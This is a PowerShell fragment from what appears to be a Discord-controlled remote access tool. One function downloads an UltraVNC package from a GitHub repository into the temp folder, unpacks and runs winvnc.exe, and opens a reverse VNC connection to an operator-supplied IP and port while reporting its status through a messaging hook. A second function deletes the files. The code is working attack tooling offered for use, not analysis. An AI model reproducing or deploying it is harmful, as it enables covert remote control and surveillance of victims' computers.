#ENABLEUVNC
Function MStartUvnc {
    param([string]$ip,[string]$port)
    sendEmbedWithImage -Title "UVNC Client Downloading" -Description "UVNC client listener should be running and attempting to connect to $ip on port $port."

    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/UltraVNC.zip"
    $vncZip = "$tempFolder\UltraVNC.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    Start-Sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    Start-Sleep 1 
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    sendEmbedWithImage -Title "UVNC Client Downloaded" -Description "UVNC client downloaded"
    Start-Process $proc -ArgumentList ("-run")
    Start-Sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
}
#DISABLEUVNC
Function MRemoveUVNC {
    sendEmbedWithImage -Title "Removing UVNC Client" -Description "Cleaning up UVNC client files..."
    $tempFolder = "$env:temp\vnc"
    if (Test-Path -Path $tempFolder) {
        rm -Path $tempFolder -Force 
    }
}
